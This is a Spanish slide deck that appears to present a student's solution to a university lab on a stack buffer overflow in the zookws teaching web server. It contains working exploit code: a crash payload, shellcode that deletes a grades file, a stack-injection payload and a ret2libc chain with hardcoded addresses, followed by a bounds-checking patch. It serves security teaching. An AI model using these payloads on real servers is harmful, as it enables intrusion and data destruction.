---
marp: true
theme: default
paginate: true
backgroundColor: #fff
backgroundImage: url('../../assets/hero-background.svg')
style: |
  section {
    font-size: 24px;
    display: flex;
    flex-direction: column;
    justify-content: flex-start;
    align-items: flex-start;
    padding: 44px 60px;
  }

  h1 {
    font-size: 1.55em;
    margin-bottom: 0.3em;
  }

  h2 {
    font-size: 1.25em;
  }

  p, li {
    line-height: 1.35;
  }

  table {
    font-size: 0.78em;
    border-collapse: collapse;
  }

  th, td {
    padding: 4px 10px;
  }

  pre {
    font-size: 0.68em;
    line-height: 1.2;
    width: 100%;
  }

  code {
    font-size: 0.95em;
  }

  ul ul li, ol ol li {
    color: #666666;
    font-size: 0.9em;
  }

  ul ul ul li, ol ol ul li {
    color: #666666;
    font-style: italic;
    font-size: 0.82em;
  }

  ul ul, ol ol {
    opacity: 0.85;
  }
---

# Buffer Overflow en zookws

### IIC2531 — Laboratorio 03

De la vulnerabilidad en `value[512]` al shellcode,
el bypass de NX y el parche definitivo.

<!-- Solución real del alumno, 2026-2 -->

---

# Objetivos del laboratorio

- Encontrar un **buffer overflow de pila** en el servidor `zookws`.
- Botar el servidor con un exploit de red (Ejercicio 2).
- Inyectar shellcode que borre `~/grades.txt` (Ejercicios 3 y 4).
- Evadir **NX** con ret2libc y el gadget `accidentally` (Ejercicio 5).
- Arreglar el código sin canarios ni cambios al `Makefile` (Ejercicio 7).

---

# Arquitectura: zookws y zoobar

- `zookd`: servidor HTTP en C, binario estático, compilado con `-fno-stack-protector`.
- `zoobar`: aplicación web en Python (CGI) servida por `zookd`.
- `main` hace `accept()` y **bifurca un hijo por cliente**:

```c
switch ((pid = fork())) {
case 0:
    process_client(cltfd);
    exit(0);
...
```

- `zookd-exstack`: pila ejecutable. `zookd-nxstack`: pila no ejecutable.
- `clean-env.sh` fija el entorno → pila y direcciones reproducibles.
- `bin.tar.gz` contiene los binarios de referencia usados por `make check-*`.

---

# Una petición, paso a paso

```text
main → accept → fork
  └─ process_client(fd)
       ├─ http_request_line(fd, reqpath, env, &env_len)
       ├─ http_request_headers(fd)
       │    └─ http_parse_line(buf, envvar, value)
       │         └─ url_decode(value, sp)
       └─ http_serve(fd, getenv("REQUEST_URI"))
```

- `env[8192]` y `reqpath[4096]` viven en `process_client`.
- `value[512]` y `envvar[512]` viven en el **frame de `http_request_headers`**.
- El header `X: ...` es la entrada que controla el atacante.

---

# La vulnerabilidad: `value[512]`

```c
const char *http_request_headers(int fd) {
    static char buf[8192];     /* fuera de la pila */
    char value[512];
    char envvar[512];
    ...
    r = http_parse_line(buf, envvar, value);
```

- `http_parse_line` decodifica el **valor** del header con `url_decode`.
- `url_decode` copia byte a byte sin conocer el tamaño del destino.
- Un valor de más de 512 bytes desborda `value` hacia direcciones crecientes.
- Se alcanzan el padding, el `%rbp` guardado y la **dirección de retorno**.
- La escritura siempre termina en `'\0'`: hay un byte nulo al final.

---

# Cadena de llamadas y `url_decode`

```c
void url_decode(char *dst, const char *src) {
    size_t i = 0;
    for (;;) {
        if (src[0] == '%' && src[1] && src[2]) {
            /* ... dst[i] = hex ... */ src += 3;
        } else if (src[0] == '+') {
            dst[i] = ' '; src++;
        } else {
            dst[i] = *src++;
            if (dst[i] == '\0') break;
        }
        i++;
    }
    dst[i] = '\0';
}
```

- No recibe `len`: **no hay límite** para `i`.
- `i` crece con la entrada, no con el tamaño del buffer.

---

# Layout real de la pila

| desde `&value` | contenido | tamaño |
|---|---|---|
| `+0x000` | `value[0..511]` | 0x200 |
| `+0x200` | padding | 0x10 |
| `+0x210` | `%rbp` guardado | 8 |
| `+0x218` | **RIP guardado** | 8 |

- `0x218 = 0x200 + 0x10 + 8`.
- `envvar` está `0x200` bytes antes de `value`:
  desde `&envvar`, el RIP está en **`0x418`**.
- gdb: `p &value` → `0x7fffffffd9a0`; `ret` en `0x7fffffffdbb8`.

---

# Medir los offsets con gdb

```bash
./clean-env.sh ./zookd-exstack 8080 &
gdb -p $(pgrep zookd-)
(gdb) break http_parse_line
(gdb) continue
(gdb) p &value
(gdb) info frame          # saved rip
(gdb) x/40gx &value
```

- `~/lab/.gdbinit` aplica `set follow-fork-mode child`.
- Sin `clean-env.sh` las direcciones cambian: el offset no.
- Verificar que el relleno llega exactamente a `+0x218`.

---

# Ejercicio 2: exploit de crash

```python
off_ret_add = 0x218
payload = b"A" * off_ret_add + b"B" * 8
enc = urllib.parse.quote_from_bytes(payload).encode("ascii")

req = b"GET / HTTP/1.0\r\n" + \
      b"X: " + enc + b"\r\n" + \
      b"\r\n"
```

- `0x218` bytes `A` llegan hasta el RIP guardado; 8 `B` lo pisan.
- El valor queda en `0x4242424242424242`.
- `quote_from_bytes` neutraliza `+`, `%` y bytes binarios.
- `make check-crash` → **PASS**.

---

# Por qué el servidor se cae

- `http_parse_line` retorna y `http_request_headers` ejecuta su epílogo.
- `leave` → `mov %rbp,%rsp; pop %rbp`: RBP = `0x4141...`, RSP inválido.
- `ret` toma `0x4242424242424242` como destino.
- El acceso a esa dirección provoca **SIGSEGV**.
- `zookd` reporta: `Child process ... terminated incorrectly, receiving signal 11`.
- `dmesg | tail` confirma el segmentation fault.

---

# Shellcode: `unlink` de grades.txt

```asm
    jmp  calladdr
popladdr:
    popq %rcx                 /* dirección del string */
    xorq %rax, %rax
    movb %al, 24(%rcx)        /* '\0' final */
    movb $SYS_unlink, %al     /* syscall 87 */
    movq %rcx, %rdi           /* pathname */
    syscall
    movb $SYS_exit, %al       /* syscall 60 */
    xorq %rdi, %rdi
    syscall
calladdr:
    call popladdr
    .ascii "/home/student/grades.txt"
```

- Truco `call/pop`: obtiene la dirección del string sin sección de datos.
- Sin bytes nulos innecesarios y con `exit(0)` para no volver a la pila rota.

---

# Probar el shellcode aislado

```bash
make
touch ~/grades.txt
./run-shellcode shellcode.bin
ls ~/grades.txt
# ls: cannot access '/home/student/grades.txt': No such file or directory
```

- `run-shellcode` salta al blob igual que lo hará el exploit.
- Si no borra el archivo, `strace -f -p $(pgrep zookd-)` muestra la syscall.
- Recrear `grades.txt` después de cada prueba exitosa.

---

# Ejercicio 4: inyección en pila ejecutable

```python
stack_buffer = 0x7fffffffd9a0          # &value

payload  = shellcode
payload += b"\x90" * (0x218 - len(shellcode))
payload += struct.pack("<Q", stack_buffer)
```

- Shellcode al inicio de `value`, relleno con NOPs.
- El `ret` salta a `&value` y ejecuta el código inyectado.
- Solo funciona con `zookd-exstack` (pila `rwx`).
- `make check-exstack` → **PASS**.

---

# Parte 3: pila no ejecutable (NX)

- `zookd-nxstack` marca la pila como `rw-`: saltar a `value` ya no ejecuta.
- Pero el `ret` **sigue bajo control**: se puede saltar a código existente.
- `unlink` ya está en libc (enlazada estáticamente al binario).
- Problema x86-64: el primer argumento va en `%rdi`, no en la pila.
- Solución: un gadget que cargue `%rdi` desde la pila y luego retorne.

---

# El gadget `accidentally`

```c
void accidentally(void) {
    __asm__("mov 16(%%rbp), %%rdi");
}
```

- Compilado: `push %rbp; mov %rsp,%rbp; mov 0x10(%rbp),%rdi; leave; ret`.
- Dirección usada: `0x555555556c15`.
- Carga el **3.er qword** del payload en `%rdi`.
- Retorna al **2.º qword** (el `ret` de su epílogo).
- Código legítimo reutilizado como gadget ROP: no se ejecuta la pila.

---

# Ejercicio 5: payload ret2libc

```python
s = b"/home/student/grades.txt\x00"
payload  = s + b"A" * (0x218 - len(s))
payload += struct.pack("<Q", 0x555555556c15)  # accidentally
payload += struct.pack("<Q", 0x15555531c430)  # unlink (libc)
payload += struct.pack("<Q", 0x7fffffffd9a0)  # &value
```

- La ruta queda al inicio de `value`: el argumento ya está en memoria.
- No se inyecta ni un byte de código ejecutable.
- `make check-libc` → **PASS**.

---

# La pila en el momento del ataque

| dirección | contenido | rol |
|---|---|---|
| `value+0x000` | `/home/student/grades.txt\0` | argumento de `unlink` |
| `value+0x218` | `accidentally` | nuevo RIP |
| `value+0x220` | `unlink` | `ret` de `accidentally` |
| `value+0x228` | `&value` | leído por `mov 16(%rbp),%rdi` |

- Al entrar al gadget, `push %rbp` deja `%rbp` en el slot de `accidentally`.
- `16(%rbp)` = `&value` → `%rdi` apunta a la ruta.
- `leave; ret` salta a `unlink` con el argumento correcto.

---

# Resultado del ataque

```text
ret → accidentally
        rdi = &value
        leave; ret → unlink
unlink("/home/student/grades.txt") = 0
```

- Se reutiliza código ya mapeado como ejecutable: **NX no interviene**.
- Tras `unlink`, el `ret` usa `&value` como dirección → SIGSEGV.
- El archivo ya fue borrado: el exploit cumple su objetivo aunque el hijo muera.

---

# Parche 1: acotar `url_decode`

```c
void url_decode(char *dst, size_t len, const char *src) {
    size_t i = 0;
    for (;;) {
        if (i + 1 >= len)      /* reserva espacio al '\0' */
            break;
        /* ... misma decodificación ... */
        i++;
    }
    dst[i] = '\0';
}
```

- `i + 1 >= len`, no `i >= len`: evita el **off-by-one** del terminador.
- Toda escritura queda dentro de `dst[0 .. len-1]`.
- El límite viaja como parámetro: la función ya no confía en `src`.

---

# Parche 2: propagar tamaños y usar `snprintf`

```c
/* http_parse_line */
url_decode(value, len_value, sp);
snprintf(envvar, len_envvar, "HTTP_%s", buf);

/* http_request_headers */
http_parse_line(buf, envvar, value,
                sizeof(envvar), sizeof(value));

/* http_request_line */
url_decode(reqpath, sizeof(reqpath), sp1);
```

- Cada llamada pasa el tamaño **real del destino**.
- `sprintf` no acepta tamaño: reemplazado por `snprintf`.
- `http_serve_executable` ya acota `headers` con `snprintf` y `headerslen`.

---

# Verificación del arreglo

```bash
make check-fixed
# check-crash-fixed: FAIL
# check-exstack-fixed: FAIL
# check-libc-fixed: FAIL

make check-crash check-exstack check-libc
# PASS (binarios originales de bin.tar.gz)
```

- **FAIL** en `check-fixed` significa que el parche bloquea el ataque.
- **PASS** ahí significaría que el exploit todavía funciona.
- En el Makefile de la VM **no existe** el target `check`: se invocan los targets por separado.
- No se modifica el `Makefile` ni los scripts de corrección.

---

# Problemas encontrados y cómo se resolvieron (1/2)

| Problema | Causa | Solución |
|---|---|---|
| `gdb` no adjuntaba | `ptrace_scope` y procesos `zookd` colgados de corridas previas | `pkill -f zookd`, salir de gdb antes de reiniciar y `follow-fork-mode child` |
| Off-by-one en `url_decode` | `if (i >= len)` dejaba escribir el `'\0'` en `dst[len]` | `if (i + 1 >= len)` |
| Uso incorrecto de `sprintf` con tamaño | `sprintf(dst, len, ...)` interpreta `len` como formato; no acota nada | `snprintf(dst, len, ...)` |

---

# Problemas encontrados y cómo se resolvieron (2/2)

| Problema | Causa | Solución |
|---|---|---|
| `sizeof` sobre un puntero | `sizeof(env)` en `http_request_line` vale 8, no el tamaño del buffer | `sizeof(reqpath)` / `4096` como límite |
| `bin.tar.gz` de 45 bytes | archivo truncado; todos los `check-*` fallaban | `git checkout -- bin.tar.gz` |
| `make check` no existe | ese Makefile no define el target | `make check-crash check-exstack check-libc` |
| `check-fixed` daba PASS | parche incompleto | revisar límites hasta obtener **FAIL** |

---

# Preguntas de defensa

**1. ¿Por qué el offset es `0x218` y no `0x200`?**
→ `0x200` buffer + `0x10` padding + 8 del `%rbp` guardado.

**2. ¿Por qué URL-encodear el payload?**
→ `url_decode` interpreta `%xx` y `+`; el encoding preserva los bytes y evita cortar el header.

**3. ¿Por qué el exploit 5 funciona con NX?**
→ No ejecuta la pila: encadena un gadget existente y `unlink` de libc.

**4. ¿Basta con agrandar `value` a 8192?**
→ No. Sin un límite explícito, otro header o una ruta larga vuelve a desbordar.
